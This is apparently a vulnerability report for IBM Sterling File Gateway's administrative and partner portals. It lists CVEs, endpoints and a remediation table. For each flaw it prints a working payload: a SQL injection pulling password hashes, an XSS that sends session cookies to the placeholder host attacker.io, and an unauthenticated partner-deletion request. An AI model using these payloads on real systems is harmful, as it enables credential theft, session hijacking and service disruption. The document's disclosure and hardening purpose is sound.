# Portal-Specific Vulnerability Report: /filegateway and /myfilegateway
**Target Version:** IBM Sterling File Gateway 6.2.1.1
**Focus:** Administrative Dashboard and Partner Portals

This report provides a detailed technical breakdown of vulnerabilities specifically resident in the primary web contexts of the File Gateway application.

---

## 2. /filegateway (Administrative Portal) Security Analysis

The `/filegateway` context is used for system management. Flaws here typically allow for full compromise of the file routing engine.

### 2.1 CVE-2025-36368: Administrative SQL Injection
*   **Detailed Description**: The File Gateway administrator dashboard fails to use parameterized queries in its search and reporting modules. An authenticated administrator (or an attacker who has hijacked an admin session) can manipulate backend SQL queries.
*   **Exact Endpoint**: `https://<SFG_HOST>/dashboard/Manager?action=SearchPartners`
*   **Vulnerable Parameter**: `partnerName=`
*   **Burp Suite Payload**:
    ```text
    ' OR 1=1 UNION SELECT USERNAME, PASSWORD_HASH FROM APP_USER --
    ```
*   **Impact**: Extraction of the entire B2Bi database schema, partner list, and credential hashes.

### 2.2 CVE-2023-40693: Reflected XSS in Admin UI
*   **Detailed Description**: The JSP rendering engine for `/filegateway` does not properly encode URL parameters, allowing arbitrary JavaScript to be reflected off the server and executed in the victim's session.
*   **Exact Endpoint**: `https://<SFG_HOST>/filegateway/error.jsp?msg=`
*   **Burp Suite Payload**:
    ```html
    <script>fetch('https://attacker.io/capture?c=' + document.cookie)</script>
    ```
*   **Impact**: Hijacking of high-privileged administrative sessions.

---

## 3. /myfilegateway (Partner Portal) Security Analysis

The `/myfilegateway` context is the partner-facing portal for file uploads, downloads, and tracking.

### 3.1 CVE-2023-40693: Reflected XSS in Partner Portal
*   **Detailed Description**: Similar to the admin portal, the partner login and error pages are vulnerable to reflected XSS, targeting your external customers and partners.
*   **Exact Endpoint**: `https://<SFG_HOST>/myfilegateway/login.jsp?error=`
*   **Burp Suite Payload**:
    ```html
    <script>alert('Partner_Session_Compromised')</script>
    ```
*   **Impact**: Impersonation of partners to download sensitive commercial files or upload malicious content into the manufacturing/distribution pipeline.

### 3.2 CVE-2026-1264: Access Control Bypass (Partner Deletion)
*   **Detailed Description**: While technically residing in the `/aft/` context, this bypass directly impacts `/myfilegateway` by allowing unauthenticated deletion of the "Partner" objects that the portal relies on.
*   **Exact Endpoint**: `https://<SFG_HOST>/aft/partner`
*   **Exploitation Mechanics**: Sending a `DELETE` request to the AFT partner API without a session cookie.
*   **Burp Suite Payload**:
    ```http
    DELETE /aft/partner/PARTNER_ID_001 HTTP/1.1
    Host: target-ibm-sfg.com:58001
    ```
*   **Impact**: Total disruption of service for a specific partner portal user.

---

## 4. Shared Information Disclosure (CVE-2025-14483)

### 4.1 Host Reconnaissance via Dashboard Metadata
*   **Detailed Description**: Authenticated users in both portals (specifically admins in `/filegateway`) can trigger responses that reveal internal installation paths.
*   **Exact Endpoint**: `https://<SFG_HOST>/dashboard/Manager?action=nodeDetails`
*   **Sample Leaked Resource**:
    ```json
    { "installPath": "C:\\IBM\\Sterling\\B2B\\node1\\" }
    ```
*   **Impact**: Precision targeting for secondary Path Traversal or LFI exploits based on the disclosed OS structure.

---

## 5. Summary Matrix for Portal Hardening

| Path | Primary Risk | Payload Signature | Remediation |
| :--- | :--- | :--- | :--- |
| `/filegateway` | SQL Injection | `UNION SELECT` | Fix Pack 6.2.1.1_2 |
| `/filegateway` | Reflected XSS | `<script>` | Fix Pack 6.2.1.1_2 |
| `/myfilegateway`| Reflected XSS | `<script>` | Fix Pack 6.2.1.1_2 |
| `/aft/` | Auth Bypass | `DELETE /aft/` | Fix Pack 6.2.1.1_2 |

> [!CAUTION]
> **Priority Recommendation**: Port **58001** (AFT) and Ports **8080/8443** (Dashboard) should be restricted to internal management VLANs only. NEVER expose the administrative `/filegateway` context to the public internet.
